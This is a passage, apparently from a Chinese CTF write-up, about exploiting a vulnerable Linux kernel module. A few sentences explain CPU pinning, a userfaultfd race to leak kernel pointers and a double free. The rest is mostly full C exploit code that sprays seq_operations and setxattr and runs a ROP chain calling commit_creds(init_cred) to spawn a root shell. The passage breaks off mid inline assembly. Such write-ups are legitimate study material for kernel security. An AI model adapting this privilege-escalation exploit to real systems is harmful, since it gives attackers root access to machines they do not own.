+</span></span><span style=display:flex><span>    sched_setaffinity(<span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>, <span style=color:#666>&amp;</span>cpu_mask);
+</span></span></code></pre></div><p>我们在调试时发现 double free 后，申请 seq_operation 和 setxattr 的 kvmalloc 时都无法申请到 double free 的 chunk，猜测是 <code>kmem_cache</code> 中的 <code>struct kmem_cache_cpu __percpu *cpu_slab;</code> 字段，也就是 cpu cache 造成的，所以把进程绑定到了一个 cpu 上，就成功分配了。</p><p>leak 使用了 <code>shm_file_data</code> 结构体。由于 push 和 pop 操作的锁是分离的，所以 push 时通过 userfaultfd 卡住 copy_from_user 的操作，此时 push 进的 node 里面还是脏数据，在 userfaultfd handler 中 pop 即可读出脏数据，由此完成 leak。</p><p>exp 照抄的 <strong>@arttnba3</strong> 大师傅的 exp，改了些偏移之类的。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// x86_64-buildroot-linux-uclibc-cc -masm=intel -static -pthread -o  exp exp.c
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/types.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/xattr.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/userfaultfd.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;pthread.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;errno.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;fcntl.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;signal.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;poll.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;string.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/mman.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/syscall.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/ioctl.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/sem.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/ipc.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/shm.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;semaphore.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#007020>#define KERNCALL __attribute__((regparm(3)))
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span>size_t user_cs, user_gs, user_ds, user_es, user_ss, user_rflags, user_rsp;
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>get_userstat</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>size_t commit_creds;
+</span></span><span style=display:flex><span>size_t prepare_kernel_cred;
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#666>*</span> kernel_base <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff81000000</span>;
+</span></span><span style=display:flex><span>size_t kernel_offset <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> pthread_t monitor_thread;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> dev_fd;
+</span></span><span style=display:flex><span>size_t          seq_fd;
+</span></span><span style=display:flex><span>size_t          seq_fd_reserve[<span style=color:#40a070>0x100</span>];
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>char</span>     <span style=color:#666>*</span>page <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> size_t   page_size;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>errExit</span>(<span style=color:#902000>char</span> <span style=color:#666>*</span>msg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\033</span><span style=color:#4070a0>[31m</span><span style=color:#4070a0;font-weight:700>\033</span><span style=color:#4070a0>[1m[x] Error at: </span><span style=color:#4070a0;font-weight:700>\033</span><span style=color:#4070a0>[0m%s</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, msg);
+</span></span><span style=display:flex><span>	exit(EXIT_FAILURE);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>registerUserFaultFd</span>(<span style=color:#902000>void</span> <span style=color:#666>*</span> addr, <span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> len, <span style=color:#902000>void</span> (<span style=color:#666>*</span>handler)(<span style=color:#902000>void</span><span style=color:#666>*</span>))
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#902000>long</span> uffd;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_api</span> uffdio_api;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_register</span> uffdio_register;
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> s;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>/* Create and enable userfaultfd object */</span>
+</span></span><span style=display:flex><span>    uffd <span style=color:#666>=</span> syscall(__NR_userfaultfd, O_CLOEXEC <span style=color:#666>|</span> O_NONBLOCK);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (uffd <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>        errExit(<span style=color:#4070a0>&#34;userfaultfd&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    uffdio_api.api <span style=color:#666>=</span> UFFD_API;
+</span></span><span style=display:flex><span>    uffdio_api.features <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_API, <span style=color:#666>&amp;</span>uffdio_api) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>        errExit(<span style=color:#4070a0>&#34;ioctl-UFFDIO_API&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    uffdio_register.range.start <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) addr;
+</span></span><span style=display:flex><span>    uffdio_register.range.len <span style=color:#666>=</span> len;
+</span></span><span style=display:flex><span>    uffdio_register.mode <span style=color:#666>=</span> UFFDIO_REGISTER_MODE_MISSING;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_REGISTER, <span style=color:#666>&amp;</span>uffdio_register) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>        errExit(<span style=color:#4070a0>&#34;ioctl-UFFDIO_REGISTER&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    s <span style=color:#666>=</span> pthread_create(<span style=color:#666>&amp;</span>monitor_thread, <span style=color:#007020>NULL</span>, handler, (<span style=color:#902000>void</span> <span style=color:#666>*</span>) uffd);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (s <span style=color:#666>!=</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>        errExit(<span style=color:#4070a0>&#34;pthread_create&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>push</span>(<span style=color:#902000>char</span> <span style=color:#666>*</span>data)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (ioctl(dev_fd, <span style=color:#40a070>0x1314001</span>, data) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>        errExit(<span style=color:#4070a0>&#34;push!&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>pop</span>(<span style=color:#902000>char</span> <span style=color:#666>*</span>data)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (ioctl(dev_fd, <span style=color:#40a070>0x1314002</span>, data) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>        errExit(<span style=color:#4070a0>&#34;pop!&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#666>*</span> <span style=color:#06287e>leak_thread</span>(<span style=color:#902000>void</span> <span style=color:#666>*</span>arg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffd_msg</span> msg;
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> fault_cnt <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#902000>long</span> uffd;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_copy</span> uffdio_copy;
+</span></span><span style=display:flex><span>    ssize_t nread;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    uffd <span style=color:#666>=</span> (<span style=color:#902000>long</span>) arg;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (;;) 
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pollfd</span> pollfd;
+</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> nready;
+</span></span><span style=display:flex><span>        pollfd.fd <span style=color:#666>=</span> uffd;
+</span></span><span style=display:flex><span>        pollfd.events <span style=color:#666>=</span> POLLIN;
+</span></span><span style=display:flex><span>        nready <span style=color:#666>=</span> poll(<span style=color:#666>&amp;</span>pollfd, <span style=color:#40a070>1</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;poll&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        nread <span style=color:#666>=</span> read(uffd, <span style=color:#666>&amp;</span>msg, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (nread <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;EOF on userfaultfd!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (nread <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;read&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (msg.event <span style=color:#666>!=</span> UFFD_EVENT_PAGEFAULT)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;Unexpected event on userfaultfd</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;[*] push trapped in userfaultfd.&#34;</span>);
+</span></span><span style=display:flex><span>        pop(<span style=color:#666>&amp;</span>kernel_offset);
+</span></span><span style=display:flex><span>        printf(<span style=color:#4070a0>&#34;[*] leak ptr: %p</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, kernel_offset);
+</span></span><span style=display:flex><span>        kernel_offset <span style=color:#666>-=</span> <span style=color:#40a070>0xffffffff81a32c00</span>;
+</span></span><span style=display:flex><span>        kernel_base <span style=color:#666>+=</span> kernel_offset;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        uffdio_copy.src <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) page;
+</span></span><span style=display:flex><span>        uffdio_copy.dst <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) msg.arg.pagefault.address <span style=color:#666>&amp;</span>
+</span></span><span style=display:flex><span>                                              <span style=color:#666>~</span>(page_size <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>        uffdio_copy.len <span style=color:#666>=</span> page_size;
+</span></span><span style=display:flex><span>        uffdio_copy.mode <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>        uffdio_copy.copy <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_COPY, <span style=color:#666>&amp;</span>uffdio_copy) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;ioctl-UFFDIO_COPY&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#666>*</span> <span style=color:#06287e>double_free_thread</span>(<span style=color:#902000>void</span> <span style=color:#666>*</span>arg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffd_msg</span> msg;
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> fault_cnt <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#902000>long</span> uffd;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_copy</span> uffdio_copy;
+</span></span><span style=display:flex><span>    ssize_t nread;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    uffd <span style=color:#666>=</span> (<span style=color:#902000>long</span>) arg;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (;;) 
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pollfd</span> pollfd;
+</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> nready;
+</span></span><span style=display:flex><span>        pollfd.fd <span style=color:#666>=</span> uffd;
+</span></span><span style=display:flex><span>        pollfd.events <span style=color:#666>=</span> POLLIN;
+</span></span><span style=display:flex><span>        nready <span style=color:#666>=</span> poll(<span style=color:#666>&amp;</span>pollfd, <span style=color:#40a070>1</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;poll&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        nread <span style=color:#666>=</span> read(uffd, <span style=color:#666>&amp;</span>msg, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (nread <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;EOF on userfaultfd!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (nread <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;read&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (msg.event <span style=color:#666>!=</span> UFFD_EVENT_PAGEFAULT)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;Unexpected event on userfaultfd</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;[*] pop trapped in userfaultfd.&#34;</span>);
+</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;[*] construct the double free...&#34;</span>);
+</span></span><span style=display:flex><span>        pop(page);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        uffdio_copy.src <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) page;
+</span></span><span style=display:flex><span>        uffdio_copy.dst <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) msg.arg.pagefault.address <span style=color:#666>&amp;</span>
+</span></span><span style=display:flex><span>                                              <span style=color:#666>~</span>(page_size <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>        uffdio_copy.len <span style=color:#666>=</span> page_size;
+</span></span><span style=display:flex><span>        uffdio_copy.mode <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>        uffdio_copy.copy <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_COPY, <span style=color:#666>&amp;</span>uffdio_copy) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;ioctl-UFFDIO_COPY&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>size_t init_cred <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff81a2a6e0</span>;
+</span></span><span style=display:flex><span>size_t  pop_rdi_ret <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff8115305c</span>;
+</span></span><span style=display:flex><span>size_t  mov_rdi_rax_pop_rbp_ret <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff8121f89a</span>;
+</span></span><span style=display:flex><span>size_t  swapgs_restore_regs_and_return_to_usermode <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff81400d2e</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>get_root_shell</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[*] get root shell...&#34;</span>);
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>size_t mov_cr4_ret;
+</span></span><span style=display:flex><span>size_t pop_rax_4other_ret;
+</span></span><span style=display:flex><span>size_t init_cred;
+</span></span><span style=display:flex><span>size_t get_root_shell_addr;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>get_root_and_ret</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>while</span> (<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		<span style=color:#60a0b0;font-style:italic>/* code */</span>
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>size_t get_root_and_ret_addr;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#666>*</span> <span style=color:#06287e>hijack_thread</span>(<span style=color:#902000>void</span> <span style=color:#666>*</span>arg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffd_msg</span> msg;
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> fault_cnt <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#902000>long</span> uffd;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_copy</span> uffdio_copy;
+</span></span><span style=display:flex><span>    ssize_t nread;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    uffd <span style=color:#666>=</span> (<span style=color:#902000>long</span>) arg;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (;;) 
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pollfd</span> pollfd;
+</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> nready;
+</span></span><span style=display:flex><span>        pollfd.fd <span style=color:#666>=</span> uffd;
+</span></span><span style=display:flex><span>        pollfd.events <span style=color:#666>=</span> POLLIN;
+</span></span><span style=display:flex><span>        nready <span style=color:#666>=</span> poll(<span style=color:#666>&amp;</span>pollfd, <span style=color:#40a070>1</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;poll&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        nread <span style=color:#666>=</span> read(uffd, <span style=color:#666>&amp;</span>msg, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (nread <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;EOF on userfaultfd!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (nread <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;read&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (msg.event <span style=color:#666>!=</span> UFFD_EVENT_PAGEFAULT)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;Unexpected event on userfaultfd</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;[*] setxattr trapped in userfaultfd.&#34;</span>);
+</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;[*] trigger now...&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> <span style=color:#40a070>100</span>; i<span style=color:#666>++</span>)
+</span></span><span style=display:flex><span>            close(seq_fd_reserve[i]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>// trigger
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		init_cred <span style=color:#666>+=</span> kernel_offset;
+</span></span><span style=display:flex><span>        pop_rdi_ret <span style=color:#666>+=</span> kernel_offset;
+</span></span><span style=display:flex><span>		mov_cr4_ret <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff8101d910</span> <span style=color:#666>+</span> kernel_offset;
+</span></span><span style=display:flex><span>		pop_rax_4other_ret <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff81032761</span> <span style=color:#666>+</span> kernel_offset;
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>// mov_rdi_rax_pop_rbp_ret += kernel_offset;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>        prepare_kernel_cred <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff81055cb0</span> <span style=color:#666>+</span> kernel_offset;
+</span></span><span style=display:flex><span>        commit_creds <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff81055ae0</span> <span style=color:#666>+</span> kernel_offset;
+</span></span><span style=display:flex><span>        swapgs_restore_regs_and_return_to_usermode <span style=color:#666>=</span> kernel_offset <span style=color:#666>+</span> <span style=color:#40a070>0xFFFFFFFF81400AAA</span>;
+</span></span><span style=display:flex><span>		init_cred <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff81a2a6e0</span> <span style=color:#666>+</span> kernel_offset;
+</span></span><span style=display:flex><span>		get_root_and_ret_addr <span style=color:#666>=</span> <span style=color:#666>&amp;</span>get_root_and_ret;
+</span></span><span style=display:flex><span>		get_root_shell_addr <span style=color:#666>=</span> <span style=color:#666>&amp;</span>get_root_shell;
+</span></span><span style=display:flex><span>        printf(<span style=color:#4070a0>&#34;[*] gadget: %p</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, swapgs_restore_regs_and_return_to_usermode);
+</span></span><span style=display:flex><span>        __asm__(
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov r15,   0xbeefdead;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov r14,   pop_rdi_ret;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov r13,   init_cred;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov r12,   commit_creds;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov rbp,   swapgs_restore_regs_and_return_to_usermode;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov rbx,   get_root_shell_addr;&#34;</span>  
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov r11,   user_cs;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov r10,   user_rflags;&#34;</span>
